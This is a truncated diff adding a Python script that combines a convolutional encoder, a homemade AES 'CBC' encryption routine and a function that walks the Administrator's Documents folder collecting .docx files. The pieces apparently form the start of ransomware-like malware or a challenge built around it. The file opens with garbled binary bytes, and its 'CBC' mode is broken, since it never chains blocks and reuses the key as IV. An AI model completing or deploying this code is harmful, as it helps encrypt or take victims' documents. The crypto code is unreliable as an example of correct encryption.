@@ -1,0 +1,106 @@
+±ƒÿ^£²i}{0¶£á@§¬0¦ñ8ÕëI# python 
+from Crypto.Cipher import AES
+import time 
+import random
+import math
+import os
+import string
+import requests
+from docx import Document
+
+class Algo:
+    def __init__(self, fx, fy):
+        self.fx = fx
+        self.fy = fy
+        assert len(fy) > 0
+        for poly in fy:
+            assert poly > 0
+            assert poly < (1 << fx)
+        self.outputs = []
+        self.initialize_outputs()
+
+    def initialize_outputs(self):
+        self.outputs = [''] * (1 << self.fx)
+        for i in range(len(self.outputs)):
+            for j in range(len(self.fy)):
+                polynomial = self.reverse_bits(self.fx, self.fy[j])
+                input_val = i
+                output = 0
+                for k in range(self.fx):
+                    output ^= (input_val & 1) & (polynomial & 1)
+                    polynomial >>= 1
+                    input_val >>= 1
+                self.outputs[i] += '1' if output else '0'
+
+    def reverse_bits(self, num_bits, input_val):
+        output = 0
+        while num_bits > 0:
+            output = (output << 1) + (input_val & 1)
+            input_val >>= 1
+            num_bits -= 1
+        return output
+
+    def next_state(self, current_state, input_val):
+        return ((current_state >> 1) | (input_val << (self.fx - 2)))
+
+    def output(self, current_state, input_val):
+        return self.outputs[current_state | (input_val << (self.fx - 1))]
+
+    def encode(self, bits):
+        encoded = ''
+        state = 0
+
+        for i in range(len(bits)):
+            input_val = int(bits[i])
+            encoded += self.output(state, input_val)
+            state = self.next_state(state, input_val)
+
+        for i in range(self.fx - 1):
+            encoded += self.output(state, 0)
+            state = self.next_state(state, 0)
+
+        return encoded
+
+codec = Algo(3, [7,5])
+
+def pad(text, block_size):
+    padding = block_size - len(text) % block_size
+    return text + bytes([padding] * padding)
+
+def unpad(text):
+    padding = text[-1]
+    return text[:-padding]
+
+def xor_bytes(a, b):
+    return bytes(x ^ y for x, y in zip(a, b))
+
+def encrypt_block_cbc(block, key):
+    block = xor_bytes(block, key)
+    cipher = AES.new(key, AES.MODE_ECB)
+    return cipher.encrypt(block)
+
+
+def encrypt_cbc(plaintext, key):
+    block_size = len(key)
+    padded_text = pad(plaintext, block_size)
+    encrypted_text = b''
+    previous_block = key
+
+    for i in range(0, len(padded_text), block_size):
+        block = padded_text[i:i+block_size]
+        encrypted_block = encrypt_block_cbc(block, key)
+        encrypted_text += encrypted_block
+        previous_block = encrypted_block
+
+    return encrypted_text
+
+
+def list_docx():
+    documents_path = os.path.expanduser("C:\\Users\\Administrator\\Documents")  
+
+    docx_files = []  
+
+    for root, dirs, files in os.walk(documents_path):
+        for file in files:
+            if file.lower().endswith(".docx"):
+          
